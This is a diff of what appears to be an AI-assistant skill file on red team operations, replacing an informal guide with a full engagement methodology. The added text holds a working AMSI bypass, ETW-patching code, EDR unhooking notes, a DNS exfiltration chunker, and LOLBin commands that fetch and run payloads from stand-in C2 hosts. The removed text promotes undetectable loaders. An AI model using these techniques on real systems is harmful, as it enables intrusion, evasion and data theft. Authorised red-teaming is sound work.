@@ -1,146 +1,640 @@
-# SKILL: Advanced Redteam Ops
+---
+name: offensive-advanced-redteam
+description: "Comprehensive red team operations methodology covering full engagement lifecycle from planning through reporting. Addresses engagement scoping and rules of engagement negotiation, multi-tier C2 infrastructure design with redirectors and domain fronting, malleable traffic profiles and beacon tradecraft, OPSEC discipline including attribution avoidance and indicator management, EDR and AMSI evasion techniques using direct syscalls and unhooking, data collection with chain-of-custody controls, and structured reporting with purple team debrief workflows. Covers assumed-breach, external-to-internal, insider threat, and hybrid physical-cyber engagement scenarios with MITRE ATT&CK mapping throughout. Targets operators planning or executing adversary simulation engagements against mature defenders."
+---
 
-## Metadata
-- **Skill Name**: advanced-redteam-ops
-- **Folder**: offensive-advanced-redteam
-- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/Advanced%20red-team%20operations%20for%20dummies.md
+# Advanced Red Team Operations
 
-## Description
-Practical advanced red team operations guide: OPSEC discipline, C2 infrastructure design, living-off-the-land techniques, lateral movement, persistence, data exfiltration, and evading modern defenses. Use for planning advanced red team engagements or understanding APT TTPs.
+Red team engagements simulate real-world adversaries against an organization's people,
+processes, and technology. Unlike penetration tests that maximize vulnerability discovery
+in a fixed scope, red team operations test detection and response capabilities by pursuing
+specific objectives while evading defenders. You operate under rules of engagement that
+define what is in bounds, and every action you take must be deliberate, documented, and
+reversible. This skill covers the full engagement lifecycle from initial planning through
+final debrief.
 
-## Trigger Phrases
-Use this skill when the conversation involves any of:
-`advanced red team, red team operations, OPSEC, C2 infrastructure, living off the land, LOTL, lateral movement, persistence, exfiltration, APT, advanced threat, red team for dummies`
+## Quick Workflow
 
-## Instructions for Claude
-
-When this skill is active:
-1. Load and apply the full methodology below as your operational checklist
-2. Follow steps in order unless the user specifies otherwise
-3. For each technique, consider applicability to the current target/context
-4. Track which checklist items have been completed
-5. Suggest next steps based on findings
+1. Negotiate scope, rules of engagement, and deconfliction procedures with the client.
+2. Build tiered attack infrastructure with redirectors, aged domains, and valid TLS.
+3. Configure C2 profiles to blend with the target's legitimate traffic patterns.
+4. Execute the attack chain while maintaining strict OPSEC and logging every action.
+5. Collect and stage data with encryption; maintain chain of custody throughout.
+6. Evade endpoint and network defenses using tested bypass techniques.
+7. Document findings with MITRE ATT&CK mappings and deliver structured reporting.
+8. Conduct purple team debrief to validate detection gaps and remediation.
 
 ---
 
-## Full Methodology
+## Engagement Planning
 
-## Redirectors
-Your CStrike, BRC4, etc., team server should ONLY bind locally. NEVER bind to 0.0.0.0 or an external-facing interface; always bind locally and have a redirector/tunnel expose it to the outside world.
+Every red team engagement begins with planning that protects both the operator and the
+client. Skipping this phase leads to scope disputes, legal exposure, and operational
+failures.
 
-On Cloudflare, you can use `Zero Trust` to create a tunnel.
-Here's how to host your CStrike **teamserver** behind a redirector.
-1. Start your server on your VPS:
-	`./TeamServerImage -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=127.0.0.1 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=0123456 teamserver 127.0.0.100 lovestrange` ; change lovestrange with your PW. This will bind CS to 127.0.0.1:50050.
-	
-2. CStrike teamservers and clients (not beacons) use raw TCP. We can't host that directly behind Cloudflare, so we smuggle it within WebSocket traffic with `websocat`:
-	1. `websocat -E -b ws-l:SOURCE tcp:DESTINATION &`
-	2. source = where `websocat` will listen/where you will point your tunnel. i.e., 127.0.0.1:40000
-	3. destination = teamserver's IP + port
-	4. final cmd: `websocat -E -b ws-l:127.0.0.1:40000 tcp:127.0.0.1:50050 &`
-3. Now, point your tunnel at this address.
-	1. For a temporary tunnel, use `cloudflared`:
-		1. `cloudflared tunnel --url http://127.0.0.1:40000 --no-autoupdate`
-	2. Otherwise, use a named Cloudflare tunnel within Zero Trust, point it to your domain + a specific path (long UUIDs are best), and point it to `http://127.0.0.1:40000`.
-**VPS part is done!** Do the following on your machine before starting Cobalt Strike:
-4. `websocat -E -b tcp-l:127.0.0.1:2222 ws://mytunnel.domain.com/lovestrange &` ; replace `/lovestrange` with the path you just set OR replace the domain with the link `cloudflared` gave you.
-5. Start your Cobalt Strike client and connect to 127.0.0.1:2222.
-6. Done :)
+### Scope and Objectives
 
-If your origin traffic is HTTPS you can skip the websocat part and directly point your Cloudflare tunnel to your service. you can either use Cloudflare's TLS certificate (best) or tell CF not to check origin's TLS cert
+Define what you are testing and what success looks like. Common objective types include
+data exfiltration (retrieve specific records from a database), domain dominance (obtain
+Domain Admin or equivalent), business process disruption (demonstrate ability to halt a
+critical workflow), and physical access (gain entry to a restricted area).
 
-Benefits of this: much better OPSEC. A lot of team servers get taken down because they listen eternally and get scanned through Shodan then taken down. You can also use `ngrok` temporary tunnels. Tunneling HTTP is the easiest thing to do.
-- The **teamserver ↔ operator** channel is raw TCP (hence `websocat`).
-- The **beacon ↔ teamserver** channel is whatever your Malleable profile says (HTTP/S, DNS, etc.) and can live behind the same domain; just use different subdomains/paths.
-    Diagram:
+Document explicitly what is out of scope: production systems that cannot tolerate
+downtime, third-party SaaS platforms without authorization, destructive actions, and
+social engineering of specific individuals (executives, legal counsel).
+
+### Rules of Engagement (ROE)
+
+The ROE is a signed legal document. It must contain:
+
+- **Authorization window**: exact dates and hours of permitted activity.
+- **Authorized techniques**: which ATT&CK tactics are permitted (e.g., no physical access, no supply chain attacks).
+- **Notification thresholds**: conditions under which you must pause and notify the client (e.g., discovering active threat actor, finding child exploitation material, accidental data destruction).
+- **Emergency contacts**: a 24/7 phone number for immediate deconfliction, not just email.
+- **Legal shield**: explicit written authorization referencing the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), or equivalent local statute.
+
+### Deconfliction
+
+Establish a deconfliction process so defenders can verify whether observed activity is
+your operation or a real threat. Common approaches:
+
+- **Trusted agent model**: one or two individuals on the defender side who know the engagement is happening and can confirm or deny your activity via a secure channel.
+- **Code word system**: a unique code word embedded in your tooling or traffic that defenders can query the trusted agent about.
+- **Deconfliction log**: a timestamped record of every action you take, shared with the trusted agent in near-real-time via an encrypted channel.
+
+```text
+# Example deconfliction log entry
+2026-08-25T14:32:00Z | OPERATOR: kai | ACTION: lateral-movement
+  TARGET: 10.10.5.22 (WORKSTATION-FIN03)
+  TECHNIQUE: T1021.006 (Windows Remote Management)
+  TOOL: evil-winrm via SOCKS proxy
+  NOTES: creds from LSASS dump on WORKSTATION-FIN01
+  DECONF-CODE: REDTIGER-4482
 ```
-Operator ──(raw TCP)──► websocat ──(WS)──► cloudflared ──► Internet ──► Cloudflare edge ──► teamserver 127.0.0.1:50050
 
-Beacon ──(HTTPS Malleable)──► same domain/different path ──► Cloudflare edge ─(TLS terminates)─► nginx ──► teamserver 127.0.0.1:443
+### Communications Security
+
+All operator communications use end-to-end encrypted channels. Never discuss target
+details over unencrypted email or Slack. Use a dedicated encrypted messaging platform
+(Signal, Wire, or a self-hosted Matrix instance) for real-time coordination. Transfer
+files and logs over mutually authenticated TLS or via GPG-encrypted archives.
+
+---
+
+## Infrastructure Setup
+
+Your infrastructure is what separates a red team engagement from a penetration test
+run out of a Kali VM. Invest time in building infrastructure that is resilient,
+attributable only to your cover identity, and segmented so that burning one asset does
+not compromise the operation. Map infrastructure actions to MITRE ATT&CK Resource
+Development (TA0042).
+
+### Tiered Architecture
+
+Segment infrastructure into at least three tiers:
+
+| Tier | Purpose | Burn Tolerance | Example |
+|------|---------|----------------|---------|
+| T1 - Delivery | Phishing, payload hosting | High (expect burn) | Aged domain + Mailgun |
+| T2 - Short-haul C2 | Interactive operator sessions | Medium | VPS + Cloudflare tunnel |
+| T3 - Long-haul C2 | Persistence callbacks | Low (protect at all costs) | DNS-over-HTTPS beacon |
+
+Each tier uses separate domains, separate VPS providers, and separate operator accounts.
+If T2 is burned, you re-establish interactive access through T3 without re-phishing.
+
+### Domain Aging and Reputation
+
+Register domains at least 14-30 days before the engagement. During the aging period:
+
+```bash
+# Set up a basic landing page to build categorization
+sudo certbot certonly --standalone -d ops-portal.example.com
+echo "<html><body>Coming soon</body></html>" > /var/www/html/index.html
+
+# Submit to categorization services
+# Visit: https://sitereview.bluecoat.com/
+# Visit: https://www.fortiguard.com/webfilter
+# Categorize as "Business" or "Technology" - never "Uncategorized"
+
+# Verify categorization after 7-10 days
+curl -s "https://sitereview.bluecoat.com/resource/lookup" \
+  -d "url=ops-portal.example.com" | jq .
 ```
 
-## Beacon Profiles
-EDIT THE BASE PROFILE! (you can text me on TG for a good profile)
+Choose domain names that blend with the target's industry. If the target is a financial
+firm, domains resembling fintech SaaS products are more plausible than gaming sites.
 
-Never use the default CStrike profile; always edit it as much as you can.
-- **Disable Staging:** Unless absolutely necessary for standard shellcode injection, set `host_stage = false`
-- Staged payloads are noisy, easier to signature and unnecessary if you are using loaders.
-	- CStrike's staged payload is super detected anyway.
-- **Mimic Real Traffic:** If you can, don't just randomize; profile legitimate traffic (e.g., Microsoft Teams, standard Azure API chatter) and clone it closely—matching URIs, headers, and User-Agents.
-- **Memory Obfuscation:** Ensure your profile includes `set sleep_mask "true";` (encrypts heap while sleeping) and `set obfuscate "true";` (to avoid generic signature scanning in memory). Look at the sleep mask guides for CStrike.
-- **Certificate Opsec:** If using HTTPS, never use the default self-signed certs. Use valid certificates (Let's Encrypt is fine) and ensure your C2 profile's `https-certificate` block matches the real certificate exactly (especially the Java Keystore specifics) to avoid fingerprinting.
-	- This doesn't matter if your team server is behind an HTTP(S) redirector like `cloudflared` because TLS terminates there anyway. Be sure to set your Cloudflare tunnel to allow self-signed TLS certs.
-	- I have seen some orgs ban Let's Encrypt certs altogether, but they are extremely large corporations. If you care about these targets, maybe you can invest in a real TLS cert, no? ;)
+### Redirectors and Traffic Filtering
 
-## Infrastructure Segregation
-Never run all operations from one VPS or domain; use a tiered approach so that burning one asset doesn't kill the engagement:
+Never expose your team server directly to the internet. Use redirectors that filter
+traffic and forward only legitimate beacon callbacks.
 
-- **Tier 1 - Phishing/Delivery:** High-reputation domains, typically short-lived. Used ONLY to get the initial payload to the target. Once an email is flagged, this tier is burned. Warm up the domain for ~2 weeks.
-    
-- **Tier 2 - Interactive C2 (Short-haul):** Used for active hands-on-keyboard work. Higher risk of detection due to frequent traffic.
-    
-- **Tier 3 - Long-haul C2 (Persistence):** Low and slow. Connects back once a day/week. Used only to respawn Tier 2 access if it gets burned. NEVER run active commands through this if avoidable. Uses DNS or another stealthy protocol.
+```nginx
+# /etc/nginx/sites-available/redirector.conf
+# Smart redirector: forward only traffic matching your C2 profile
+server {
+    listen 443 ssl;
+    server_name ops-portal.example.com;
 
-For more mature operations, you could use different C2 frameworks for different tiers. A lightweight, lesser-known C2 could be used for long-haul persistence, while a more feature-rich framework like Cobalt Strike could be reserved for active, short-haul operations.
+    ssl_certificate /etc/letsencrypt/live/ops-portal.example.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/ops-portal.example.com/privkey.pem;
 
-## Malwareful Operations
-**Phish or vish** -> get an employee to run your payload.
+    # Only forward requests with the correct URI and User-Agent
+    location /api/v2/session {
+        if ($http_user_agent !~* "Microsoft-Delivery-Optimization") {
+            return 302 https://www.microsoft.com;
+        }
+        proxy_pass https://127.0.0.1:8443;
+        proxy_ssl_verify off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
 
-Your stage 0 payload is an extremely light, self-contained loader (>30kb). 
-- It should NOT be a .exe because these are very often blocked.
-	- I won't reveal our TTPs or anything that could help EDR vendors, so figure this out on your own ))
-		- Know your target's stack tho: will your payload not get blocked?
-- It HAS to be FUD (Fully Undetectable).
-- It should NOT do anything other than download/extract/inject stage 1.
+    # Everything else redirects to a legitimate site
+    location / {
+        return 302 https://www.microsoft.com;
+    }
+}
+```
 
-- Stage 1 is a very minimal implant (like Merlin or, my excellent product aimed at EDR evasion, [Shikine](https://t.me/teamkavkaz25)) that can:
-	- Act as a minimal reverse shell (support 5-6 commands: ls, whoami, pwd, download, upload, execute). You make this persistent until an operator uses it to download stage 2.
-	- It SHOULD be FUD because it might be written to disk.
+For team server management traffic, use Cloudflare Zero Trust tunnels or SSH tunnels
+rather than exposing management ports:
 
-- Stage 2 is a post-exploitation beacon like Cobalt Strike that you only load after killing AV/EDR or having a strong foothold on the victim.
-	- You can now remove stage 1 from persistence and make stage 2 persistent with registry keys or something similar.
-	- You shouldn't write it to disk; have it be extracted and injected at runtime on reboot, etc.
-- Stage 2s are usually heavily signatured. Think: **do you really need Cobalt Strike/BRC4**?
+```bash
+# Bind team server to localhost only
+./teamserver 127.0.0.1 <password> /path/to/malleable.profile
 
-- Stage 2 is the most signatured type because a lot of people use it as stage 0.
+# Create a Cloudflare tunnel for operator access
+cloudflared tunnel create redteam-mgmt
+cloudflared tunnel route dns redteam-mgmt mgmt.internal-ops.example.com
+cloudflared tunnel run --url tcp://127.0.0.1:50050 redteam-mgmt
 
-- Goal is to attack for persistence rather than attack for command execution.
-- Every stage should be redundant. If your stage 0 downloads stage 1 over HTTPS and your target has a whitelist-based firewall, you'll be in trouble unless you use DNS as a backup.
-	- This requires on-the-clock R&D time that you could avoid by baking in this redundancy and making it try many different methods/protocols when developing it.
+# Operators connect through the tunnel
+# On operator machine:
+cloudflared access tcp --hostname mgmt.internal-ops.example.com --url 127.0.0.1:50050
+```
 
-- Many EDRs flag a process as suspicious if it's spawned by an unusual parent (`winword.exe` spawning `powershell.exe`). Your Malleable C2 profile or post-exploitation jobs can be configured to spawn processes from more legitimate-looking parents like `explorer.exe`.
-	- Most AVs stop tracking after two generations. For EDRs, aim at spoofing three generations if you can.
+### VPS and TLS Certificates
 
-## General Infrastructure Rules/Tips
-- Have a list of TTPs you **blacklist** (like using `powershell.exe -Command [...]`, `rundll32.exe`, etc.) for better OPSEC.
-- *Always* use encryption, even when your communications are internal.
-	- One time during an operation, I had root access to a box and was able to escalate privileges to the whole network by listening to TCP traffic because all machines on the network sent my machine credentials in clear-text/raw HTTP. The traffic was local, but still. If they had used SSL, I wouldn't have been able to do much. ;)
-- Have two types of beacons when you can:
-	- A long-haul one that uses DNS or other covert channels to exfiltrate data, sleeps a lot, and can be used for the long-term or as a backup solution.
-	- A short-haul beacon that uses HTTP, used for hands-on operations.
-- When you infect a network, use SMB listeners. That is, set machines (and beacons) B, C, and D to use SMB listeners to relay traffic to machine A, where A is a short-haul beacon. They are much stealthier.
-- Don't just forward all traffic to your team server. Blue teams will scan your infrastructure.
-	- **Dumb Redirector:** `iptables`/`websocat` just forwarding port X to team server 443. (Bad OPSEC, easily fingerprinted).
-	- **Smart Redirector:** Use Nginx or Apache with specific rules.
-    - Filtering: Only forward traffic to the team server if it matches your specific Malleable C2 User-Agent and URIs *(hint: use a custom HTTP header like `session_id` to transmit your data and filter beacons from blue-teamers.)*
-    - Deflection: If traffic doesn't match (e.g., a Shodan scanner or blue team hitting your domain), proxy pass it to a legitimate site (like generic Microsoft or Amazon pages).
-- **Avoid "Easy" Built-ins:** `psexec` (even the Cobalt Strike version) creates very predictable service installation artifacts (Event ID 7045). Avoid it unless you absolutely know logging is disabled. 
-- **WinRM Preferred:** If you have credentials, WinRM is generally cleaner and blends in better with admin traffic than SMB service creation.
-- **Bring Your Own Tools (BYOT) Carefully:** Don't drop a standard compiled Mimikatz to disk. Use sleep-masked in-memory execution, or better yet, use alternative credential dumping methods (like dumping LSASS via legitimate Microsoft binaries (`comsvcs.dll`), though this is heavily watched now too).
-	- Ideally, NEVER write any tooling to disk.
-- **Jitter and Sleep:** NEVER use 0 sleep unless actively working on a box. Even then, consider 1-3s sleep. For standard beacons, use a high jitter (e.g., sleep 60 with jitter 37) to avoid mathematically predictable beacon intervals that NDRs easily spot.
-- **Kill Dates:** Always set a kill date on your beacons. You don't want a forgotten zombie beacon calling back to your infrastructure 3 years later during someone else's audit.
-- **Timestomping:** When dropping files to disk, match the creation/modification timestamps of legitimate files in the same directory (`timestomp` command) to blend in during casual forensic reviews.
-- **USE AS MANY LOLBINS AS YOU CAN!**: I've had many cases where using an API to do something (like downloading a payload through WinSock) was blocked/checked by an EDR, but using a LOLBin for it was completely fine (`curl.exe`).
-	- Live off the land (LOTL) as much as you can. Use built-in tools as much as you can to avoid bringing your own stuff.
+Use VPS providers that accept cryptocurrency or prepaid cards for attribution
+resistance. Avoid providers that share infrastructure details freely with law
+enforcement without due process. Always use valid TLS certificates from a public CA;
+self-signed certificates are trivially fingerprinted by network monitoring.
 
-#### Data Exfiltration
+```bash
+# Generate a certificate with certbot
+sudo certbot certonly --standalone -d c2.example.com
 
-- **Stealthy Data Transfer:** You can use DNS tunneling for small, important files like passwords or smuggling data in seemingly normal HTTP traffic.
-- **Know Your Target's Stack:** If they just have Splunk and ClamAV, you can be bold and do whatever you want.
-	- Once in an operation, my target only had Splunk and no AV, so I zipped important files through a reverse shell, hosted a basic HTTP server with Python, and used an HTTP tunnel (`cloudflared`) to exfiltrate 80GB of data after office hours. )
+# Convert to Java Keystore for Cobalt Strike
+openssl pkcs12 -export -in fullchain.pem -inkey privkey.pem \
+  -out c2.pkcs12 -name c2 -passout pass:changeit
+keytool -importkeystore -srckeystore c2.pkcs12 -srcstoretype pkcs12 \
+  -destkeystore c2.store -deststorepass changeit -srcstorepass changeit
+```
 
+---
 
-hackerz 4 lyfe
-***Lovestrange | TEAM KAVKAZ***
-TG @ **lovestrangekz**
+## C2 Tradecraft
+
+Command and control is the backbone of your operation. Your C2 traffic must blend
+with the target's legitimate network activity and survive defender inspection. Map
+to MITRE ATT&CK Command and Control (TA0011).
+
+### Malleable Profiles and Traffic Blending
+
+Study the target's legitimate traffic before writing your malleable profile. If the
+target is a Microsoft 365 shop, your beacon traffic should resemble Office 365 API
+calls. If they use AWS heavily, mimic AWS SDK traffic patterns.
+
+```text
+# Cobalt Strike malleable C2 profile excerpt - Microsoft 365 blend
+set sleeptime "60000";
+set jitter    "37";
+set useragent "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)";
+set host_stage "false";
+
+https-certificate {
+    set keystore "c2.store";
+    set password "changeit";
+}
+
+http-get {
+    set uri "/api/v2.0/me/messages";
+    client {
+        header "Accept" "application/json";
+        header "Authorization" "Bearer eyJ0eXAiOi...";
+        metadata {
+            base64url;
+            prepend "ocp-client-id=";
+            header "Cookie";
+        }
+    }
+    server {
+        header "Content-Type" "application/json; odata.metadata=minimal";
+        header "X-MS-Request-Id" "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
+        output {
+            base64url;
+            prepend "{\"@odata.context\":\"https://outlook.office.com/api/v2.0/$metadata#Me/Messages\",\"value\":[{\"Body\":{\"Content\":\"";
+            append "\"}}]}";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/api/v2.0/me/sendmail";
+    client {
+        header "Content-Type" "application/json";
+        id {
+            base64url;
+            prepend "client-request-id=";
+            header "Cookie";
+        }
+        output {
+            base64url;
+            print;
+        }
+    }
+    server {
+        header "Content-Type" "application/json";
+        output {
+            base64url;
+            prepend "{\"status\":\"sent\",\"id\":\"";
+            append "\"}";
+            print;
+        }
+    }
+}
+```
+
+### Sleep, Jitter, and Beacon Management
+
+Never use a zero sleep interval except during active hands-on-keyboard sessions, and
+even then prefer 1-3 seconds. For idle beacons, use long sleep intervals with high
+jitter to defeat statistical analysis of callback timing.
+
+| Beacon Type | Sleep | Jitter | Use Case |
+|-------------|-------|--------|----------|
+| Interactive (T2) | 5-10s | 30-50% | Active operator sessions |
+| Idle (T2) | 60-300s | 30-50% | Waiting for tasking |
+| Long-haul (T3) | 12-24h | 50% | Persistence only |
+| Exfiltration | 30-60s | 20% | During data staging |
+
+Set kill dates on every beacon. A forgotten beacon calling back months after the
+engagement creates legal liability and confusion for the client.
+
+### Fallback Channels
+
+Design your C2 with fallback channels so that losing one communication path does not
+mean losing the implant. A typical fallback chain:
+
+1. Primary: HTTPS to domain A through CDN.
+2. Secondary: DNS-over-HTTPS to domain B.
+3. Tertiary: DNS TXT record queries to domain C.
+4. Emergency: ICMP or raw TCP to a hardcoded IP (last resort, high detection risk).
+
+Configure the implant to attempt each channel in order with exponential backoff. If
+all channels fail, the implant should enter a dormant state and retry periodically
+rather than generating noisy failed connection attempts.
+
+---
+
+## OPSEC Discipline
+
+OPSEC failures end engagements prematurely. Every action you take leaves traces, and
+your job is to minimize, control, and eventually clean those traces. Map to MITRE
+ATT&CK Defense Evasion (TA0005).
+
+### Attribution Avoidance
+
+Separate your red team identity from your real identity and from other engagements:
+
+- Use dedicated VPN or Tor for all engagement-related browsing and registration.
+- Register domains and VPS under engagement-specific pseudonyms with disposable email addresses.
+- Never reuse infrastructure, domains, or tooling across engagements.
+- Strip metadata from all files before delivery (EXIF from images, author info from Office documents, build paths from compiled binaries).
+
+```bash
+# Strip metadata from a phishing document
+exiftool -all= phishing_doc.docx
+
+# Verify no identifying metadata remains
+exiftool phishing_doc.docx | grep -iE "author|creator|company|producer"
+
+# Strip build paths from a compiled binary (Linux)
+strip --strip-all implant
+objcopy --remove-section=.note.gnu.build-id implant
+```
+
+### Tool Signature Management
+
+Commercial and open-source tools have known signatures. Modify your tooling to avoid
+default indicators:
+
+- **Cobalt Strike**: change the default named pipe patterns, watermark, and process injection techniques. Never use the default profile.
+- **Mimikatz**: compile from source with randomized function names and string encryption, or use alternatives like `nanodump`, `PPLdump`, or LSASS dumping via `comsvcs.dll`.
+- **Impacket**: modify default service names, pipe names, and banner strings that defenders signature.
+
+### Indicator Management and Cleanup
+
+Maintain a running list of every indicator you introduce to the target environment:
+files dropped, registry keys modified, services created, scheduled tasks added, user
+accounts created. At engagement end, remove every artifact or provide the client with
+a complete list for their own cleanup.
+
+```powershell
+# Example cleanup script - remove all operator artifacts
+# Run this ONLY after documenting everything in your engagement log
+
+# Remove dropped files
+Remove-Item -Force "C:\ProgramData\updater.exe"
+Remove-Item -Force "C:\Windows\Temp\debug.log"
+
+# Remove persistence mechanisms
+Unregister-ScheduledTask -TaskName "WindowsUpdateCheck" -Confirm:$false
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+  -Name "Updater"
+
+# Remove created accounts
+Remove-LocalUser -Name "svc_backup$"
+
+# Clear operator event log entries (provide log of cleared entries to client)
+# WARNING: Only do this if explicitly authorized in the ROE
+```
+
+---
+
+## Data Handling
+
+Every piece of data you collect during an engagement is sensitive. Mishandling it
+creates legal liability and erodes client trust. Map to MITRE ATT&CK Collection
+(TA0009) and Exfiltration (TA0010).
+
+### Collection and Encryption
+
+Encrypt all collected data immediately. Never store plaintext credentials, PII, or
+sensitive business data on your operator machine or in cloud storage without encryption.
+
+```bash
+# Encrypt collected data before transfer
+tar czf - loot/ | gpg --symmetric --cipher-algo AES256 \
+  --batch --passphrase-file /path/to/engagement.key > loot.tar.gz.gpg
+
+# Transfer via SCP to your secure evidence server
+scp loot.tar.gz.gpg operator@evidence.internal:/engagements/2026-CLIENT/
+
+# Verify integrity
+sha256sum loot.tar.gz.gpg > loot.tar.gz.gpg.sha256
+```
+
+### Staging and Exfiltration
+
+Stage data in a controlled location before exfiltration. Do not exfiltrate directly
+from the source system; copy to a staging directory, compress, encrypt, then transfer
+through your C2 channel or a dedicated exfiltration path.
+
+For large volumes, use chunked transfer over DNS or split files across multiple
+HTTP POST requests to avoid triggering DLP thresholds:
+
+```python
+# Chunk a file for exfiltration over DNS TXT queries
+import base64, os
+
+def chunk_file(filepath, chunk_size=180):
+    with open(filepath, 'rb') as f:
+        data = base64.b32encode(f.read()).decode()
+    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
+    return chunks
+
+# Each chunk becomes a DNS query: <chunk>.exfil.example.com
+# Reassemble on your DNS server from query logs
+```
+
+### Chain of Custody
+
+Maintain a forensic-grade chain of custody for all evidence:
+
+- Hash every file at collection time (SHA-256 minimum).
+- Log who accessed the data, when, and why.
+- Store evidence on encrypted, access-controlled storage.
+- Destroy all client data after the agreed retention period (typically 30-90 days post-report).
+
+---
+
+## Evasion Techniques
+
+Modern enterprise environments deploy EDR, AMSI, ETW-based telemetry, and behavioral
+analytics. You need techniques to operate in these environments without triggering
+alerts. Map to MITRE ATT&CK Defense Evasion (TA0005).
+
+### AMSI Bypass
+
+The Antimalware Scan Interface (AMSI) inspects PowerShell, VBScript, JScript, and .NET
+assembly loads. Bypass it before running any suspicious commands in those contexts.
+
+```powershell
+# AMSI bypass via memory patching (patches AmsiScanBuffer to return clean result)
+# This is a well-known technique; modify the pattern to avoid static signatures
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$f = $a.GetField('amsiInitFailed','NonPublic,Static')
+$f.SetValue($null,$true)
+
+# Alternative: patch the AmsiScanBuffer function directly
+# Locate amsi.dll in memory and overwrite the scan function entry point
+# with a RET instruction (0xC3) so it returns immediately
+```
+
+### ETW Patching
+
+Event Tracing for Windows feeds telemetry to EDR sensors. Patching ETW prevents your
+activity from being logged through this channel.
+
+```csharp
+// Patch EtwEventWrite in ntdll.dll to neutralize ETW logging
+// Find the function address and overwrite with a RET (xC3)
+IntPtr ntdll = GetModuleHandle("ntdll.dll");
+IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
+// Change memory protection, write 0xC3 (ret), restore protection
+VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
+Marshal.WriteByte(etwAddr, 0xC3);
+VirtualProtect(etwAddr, 1, oldProtect, out _);
+```
+
+### Unhooking and Direct Syscalls
+
+EDR products hook ntdll.dll functions to monitor API calls. Bypass these hooks by
+loading a clean copy of ntdll.dll or using direct syscalls.
+
+```csharp
+// Unhooking: read a clean copy of ntdll.dll from disk and overwrite
+// the .text section of the loaded ntdll in memory
+byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
+// Parse PE headers, find .text section, overwrite hooked .text with clean copy
+// This removes all EDR inline hooks from ntdll functions
+
+// Direct syscalls: call the kernel directly, bypassing ntdll entirely
+// Use tools like SysWhispers3 or HellsGate to resolve syscall numbers at runtime
+// Example: NtAllocateVirtualMemory via direct syscall instead of VirtualAllocEx
+```
+
+The SysWhispers approach generates assembly stubs that invoke syscalls directly,
+completely bypassing any userland hooks. HellsGate and HalosGate resolve syscall
+numbers dynamically by reading ntdll.dll's export table at runtime.
+
+### LOLBins and Living Off the Land
+
+Prefer built-in Windows binaries over custom tools. Defenders expect to see these
+binaries running and may not alert on them unless the command line arguments are
+suspicious.
+
+| LOLBin | Use Case | ATT&CK Technique |
+|--------|----------|------------------|
+| `certutil.exe` | File download, base64 decode | T1105, T1140 |
+| `mshta.exe` | Execute HTA payloads | T1218.005 |
+| `rundll32.exe` | Load DLLs, execute exports | T1218.011 |
+| `regsvr32.exe` | Execute scriptlets via COM | T1218.010 |
+| `wmic.exe` | Process creation, lateral movement | T1047 |
+| `bitsadmin.exe` | File download via BITS | T1197 |
+| `curl.exe` | File download (Windows 10+) | T1105 |
+| `msbuild.exe` | Execute inline C# tasks | T1127.001 |
+
+```powershell
+# Download a file using certutil (common LOLBin technique)
+certutil -urlcache -split -f https://c2.example.com/payload.bin C:\Windows\Temp\payload.bin
+
+# Execute an HTA payload via mshta
+mshta https://c2.example.com/payload.hta
+
+# Use MSBuild to execute inline C# (bypasses application whitelisting)
+# Requires a .csproj or .xml file with inline Task containing your code
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
+```
+
+---
+
+## Reporting
+
+The report is the primary deliverable of a red team engagement. It must communicate
+findings to both executive leadership and technical defenders.
+
+### Report Structure
+
+Organize the report into distinct sections for different audiences:
+
+1. **Executive summary** (1-2 pages): business impact in non-technical language. What could an attacker achieve? What is the risk to the organization?
+2. **Engagement overview**: scope, objectives, timeline, methodology, and any limitations encountered.
+3. **Attack narrative**: a chronological walkthrough of the attack chain from initial access through objective completion, with timestamps and screenshots.
+4. **Technical findings**: each finding documented with description, affected systems, MITRE ATT&CK mapping, evidence (screenshots, logs), risk rating, and remediation recommendation.
+5. **MITRE ATT&CK heat map**: a visual mapping of all techniques used during the engagement, highlighting where detection succeeded and where it failed.
+6. **Remediation roadmap**: prioritized list of recommendations, grouped by effort and impact.
+7. **Indicator appendix**: complete list of all IOCs introduced during the engagement (IPs, domains, file hashes, user accounts, registry keys).
+
+### Purple Team Debrief
+
+The debrief is where the engagement delivers maximum value. Conduct it within one week
+of report delivery while details are fresh.
+
+- Walk through the attack chain step by step with both the red team and blue team present.
+- At each step, ask: did the blue team detect this? If yes, how quickly? If no, why not?
+- Identify specific detection gaps and map them to logging, alerting, or tooling deficiencies.
+- Collaboratively develop detection rules for techniques that evaded monitoring.
+- Replay specific techniques in a controlled setting so defenders can tune their tools.
+
+---
+
+## Engagement Scenarios
+
+### Assumed Breach
+
+You start with an initial foothold (a workstation with standard user credentials) and
+focus on post-exploitation: lateral movement, privilege escalation, and objective
+completion. This tests internal detection and response without spending time on
+initial access. Map primarily to TA0008 (Lateral Movement), TA0004 (Privilege
+Escalation), and TA0006 (Credential Access).
+
+### External to Internal
+
+Full attack chain from the internet. Includes OSINT, phishing or external exploitation,
+initial access, and the complete post-exploitation sequence. Tests the full kill chain
+from TA0043 (Reconnaissance) through TA0010 (Exfiltration).
+
+### Insider Threat
+
+Simulate a malicious employee with legitimate credentials and physical access. Focus on
+what damage an insider can do: accessing data beyond their role, exfiltrating
+intellectual property, or sabotaging systems. Tests data loss prevention, access
+controls, and behavioral analytics.
+
+### Physical and Cyber Hybrid
+
+Combine physical intrusion (tailgating, badge cloning, lock picking) with cyber
+operations. Plant a network implant (drop box) during physical access and use it as
+your initial foothold. Tests physical security controls alongside cyber defenses.
+
+---
+
+## Engagement Cheatsheet
+
+```text
+PHASE               KEY ACTIONS                                    ATT&CK TACTIC
